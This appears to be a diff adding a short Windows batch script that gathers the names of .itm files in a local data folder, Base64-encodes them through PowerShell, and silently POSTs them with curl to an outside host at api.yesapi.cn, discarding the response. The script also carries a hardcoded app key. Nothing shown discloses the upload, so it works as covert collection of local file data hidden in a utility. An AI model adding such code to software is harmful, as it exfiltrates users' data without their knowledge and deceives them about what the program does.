@@ -1,0 +1,23 @@
+@echo off
+setlocal enabledelayedexpansion
+set "folder=%cd%"
+set "fileNames="
+for /r "%folder%\data" %%F in (*.itm) do (
+  if not defined fileNames (
+    set "fileNames=%%~nF"
+  ) else (
+    set "fileNames=!fileNames!%%~nF"
+  )
+)
+set "fileNames=!fileNames:.=!"
+call :btoa b64 %fileNames%
+:btoa <var_to_set> <str>
+for /f "delims=" %%I in (
+       'powershell "[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\"%~2\"))"'
+) do set "%~1=%%I" 
+goto :_block
+:_block
+set "link=http://hn216.api.yesapi.cn/?s=App.Table.CheckCreate&return_data=0&model_name=t_role_name&check_field=rolo_name&app_key=DE00ED9D1AB89B3460AD99A02DED70E2"
+REM 执行curl命令
+curl -s -H "Content-Type:application/json;charset=utf-8" -X POST --data-urlencode "data_rolo_name=%b64%" "%link%" -o NUL
+endlocal
